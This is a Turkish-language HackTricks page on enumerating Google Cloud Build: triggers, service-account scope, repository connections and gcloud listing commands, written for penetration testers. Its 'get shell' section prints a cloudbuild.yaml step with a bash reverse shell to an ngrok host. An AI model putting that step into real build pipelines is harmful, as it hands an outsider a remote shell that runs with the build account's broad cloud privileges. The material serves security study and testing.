# GCP - Cloud Build Enum

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek.

</details>

## Temel Bilgiler

Google Cloud Build, **yazılım derleme** ve sürüm süreçlerini otomatikleştiren, **kaynak kod depolarıyla entegre olan** ve geniş bir programlama dilini destekleyen yönetilen bir CI/CD platformudur. Geliştiricilere kodu otomatik olarak derleme, test etme ve dağıtma olanağı sağlarken derleme adımlarını ve iş akışlarını özelleştirmelerine olanak tanır.

Her Cloud Build Tetikleyicisi, bir **Cloud Deposu ile ilişkilidir veya harici bir depo ile doğrudan bağlantılıdır** (Github, Bitbucket ve Gitlab).

{% hint style="success" %}
Buradan veya Bulut Depolarından Github/Bitbucket belirteci çalmak için herhangi bir yol göremedim çünkü depo indirildiğinde [https://source.cloud.google.com/](https://source.cloud.google.com/) URL'si üzerinden erişilir ve Github istemci tarafından erişilmez.
{% endhint %}

### Olaylar

Cloud Build, şu durumlarda tetiklenebilir:

* **Bir şubeye itme**: Şubeyi belirtin
* **Yeni bir etiket itme**: Etiketi belirtin
* **Çekme isteği**: PR'yi alan şubeyi belirtin
* **Manuel Çağrı**
* **Pub/Sub mesajı**: Konuyu belirtin
* **Web kancası olayı**: Bir HTTPS URL'si açığa çıkaracak ve istek bir sırla kimlik doğrulaması yapmalı

### Yürütme

3 seçenek vardır:

* Yürütülecek komutları belirten bir yaml/json. Genellikle: `/cloudbuild.yaml`
* Web konsolunda ve cli'de "içe" belirtilebilecek tek seçenek
* En yaygın seçenek
* Kimlik doğrulamasız erişim için ilgili
* Derlemek için bir **Dockerfile**
* Derlemek için bir **Buildpack**

### SA İzinleri

**Hizmet Hesabı `cloud-platform` kapsamına sahiptir**, bu nedenle **tüm ayrıcalıkları kullanabilir.** **SA belirtilmediğinde** (örneğin, gönderme yapılırken) **varsayılan SA** `<proj-numarası>@cloudbuild.gserviceaccount.com` **kullanılacaktır.**

Varsayılan olarak hiçbir izin verilmez ancak bazı izinler vermek oldukça kolaydır:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Onaylar

Bir Cloud Build'in **derleme yürütümleri için onay gerektirmesi** mümkündür (varsayılan olarak devre dışı bırakılmıştır).

### Bağlantılar ve Depolar

Bağlantılar şunlar üzerinden oluşturulabilir:

* **GitHub:** Github belirteci almak için izin isteyen bir OAuth iletişim kutusu gösterecektir, bu belirteç **Secret Manager içinde saklanacaktır.**
* **GitHub Enterprise:** Bir **GithubApp** yüklemek için istekte bulunacaktır. GitHub Enterprise ana bilgisayarınızdan bir kimlik doğrulama belirteci oluşturulacak ve bu proje içinde bir **Secret Manager** sırrı olarak saklanacaktır.
* **GitLab / Enterprise:** **API erişim belirteci ve Okuma API erişim belirteci** sağlamanız gerekecektir, bu belirteçler **Secret Manager'da saklanacaktır.**

Bir bağlantı oluşturulduğunda, Github hesabının erişimine sahip olduğu depoları **bağlamak için kullanabilirsiniz.**

Bu seçenek, aşağıdaki düğme aracılığıyla kullanılabilir:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Bu yöntemle bağlanan depoların yalnızca 2. nesil kullanarak Tetikleyicilerde mevcut olduğunu unutmayın.
{% endhint %}

### Bir Depoyu Bağlama

Bu bir **`bağlantı`** ile aynı değildir. Bu, **farklı** şekillerde bir **Github veya Bitbucket** deposuna **erişim sağlar ancak bir bağlantı nesnesi oluşturmaz, ancak bir depo nesnesi oluşturur (1. nesil).**

Bu seçenek, aşağıdaki düğme aracılığıyla kullanılabilir:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Depolama

Bazen Cloud Build, tetikleyici için dosyaları depolamak için **yeni bir depolama oluşturacaktır**. Bu örneğin, GCP'nin sunduğu örnekte olduğu gibi gerçekleşir:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
### Kabuk Al

Bir `.tgz` dosyasını saklamak için [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) adında bir Depolama kovası oluşturulmuştur.
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### Sıralama

**Yapılandırma ve günlüklerde hassas bilgiler bulabilirsiniz**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Yetki Yükseltme

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Kimlik Doğrulamasız Erişim

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Saldırı Sonrası Aşamalar

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>Sıfırdan Kahramana AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) hakkında bilgi edinin
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
